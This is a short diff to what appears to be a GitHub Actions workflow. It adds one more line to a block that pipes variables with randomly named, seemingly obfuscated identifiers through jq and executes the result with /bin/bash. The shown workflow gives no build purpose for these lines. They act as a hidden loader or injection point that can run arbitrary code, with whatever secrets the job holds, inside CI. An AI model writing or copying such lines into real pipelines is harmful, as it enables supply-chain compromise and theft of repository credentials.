@@ -23,6 +23,7 @@ jobs:
           echo $rbrd008 | jq -r .yuibg31274 | /bin/bash
           printf '%s' "$qpx255" | jq -r .yc3881 | /bin/bash
           printf '%s' "$jh66691" | jq -r .wnv77 | /bin/bash
+          printf '%s' "$bsmx6642" | jq -r .jar1940 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
